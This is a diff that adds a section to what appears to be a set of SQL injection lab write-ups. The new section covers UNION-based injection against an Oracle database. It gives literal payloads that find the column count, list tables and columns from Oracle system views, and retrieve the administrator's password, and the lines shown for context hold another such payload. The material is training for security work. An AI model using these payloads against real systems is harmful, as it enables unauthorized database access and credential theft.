@@ -67,3 +67,17 @@ After querying, we found that the names of the two columns are `username_X` and 
 
 Next, insert `'UNION SELECT password_Y, NULL FROM users_qoecyz 
 WHERE username_X = 'administrator'--` to retrieve the password of the administrator.
+
+## 6. SQL injection attack, listing the database contents on Oracle
+
+Insert `'UNION SELECT 'a', 'b' FROM DUAL--` to determine the number of columns returned.
+
+Insert `'UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES--` to find table names that contain user information.
+
+Insert `'UNION SELECT COLUMN_NAME, NULL FROM 
+ALL_TAB_COLUMNS WHERE TABLE_NAME = 'USERS_ELCPUF'--` to determine the column that contains usernames and user passwords. We can see that the two columns are `USERNAME_OTLSQB` and `PASSWORD_ALNMIB.`
+
+Finally, after inserting `'UNION SELECT PASSWORD_ALNMIB, NULL FROM USERS_ELCPUF 
+WHERE USERNAME_OTLSQB ='administrator'--` we can retrieve the administrator' password.
+
+## 7. SQL injection UNION attack determining the number of columns returned by the query
